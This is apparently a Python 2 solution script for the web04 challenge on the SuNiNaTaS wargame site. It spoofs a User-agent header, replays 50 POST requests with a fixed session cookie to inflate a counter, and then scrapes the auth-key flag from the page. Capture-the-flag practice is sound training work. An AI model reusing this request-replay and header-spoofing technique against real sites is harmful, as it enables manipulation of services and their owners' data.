#!/usr/bin/python
# -*- coding: utf-8 -*-
# do9dark
 
import httplib
import sys
 
sys.stdout.write('[-]Try: ')
for i in range(0,50):
    sys.stdout.write(str(i+1)+' ')
    host = 'suninatas.com'
    url = '/Part_one/web04/web04_ck.asp'
    message = 'total='+str(i+1)
    conn = httplib.HTTPConnection(host)
    conn.putrequest('POST',url)
    conn.putheader('Cookie','ASPSESSIONIDASBDRCDD=FCJOLAOBEDLFOCAKCJKIHODO')
    conn.putheader('User-agent','SuNiNaTaS')
    conn.putheader('Content-length',"%d" % len(message))
    conn.endheaders()
    conn.send(message)
    data = conn.getresponse().read()
    conn.close()
 
host = 'suninatas.com'
url = '/Part_one/web04/web04.asp'
conn = httplib.HTTPConnection(host)
conn.putrequest('GET',url)
conn.putheader('Cookie','ASPSESSIONIDASBDRCDD=FCJOLAOBEDLFOCAKCJKIHODO')
conn.putheader('User-agent','SuNiNaTaS')
conn.endheaders()
data = conn.getresponse().read()
conn.close()
 
print '\n[-]Flag: ' + data[data.find('<b>Auth key</b></font></td>')+55:data.find('<b>Auth key</b></font></td>')+78]
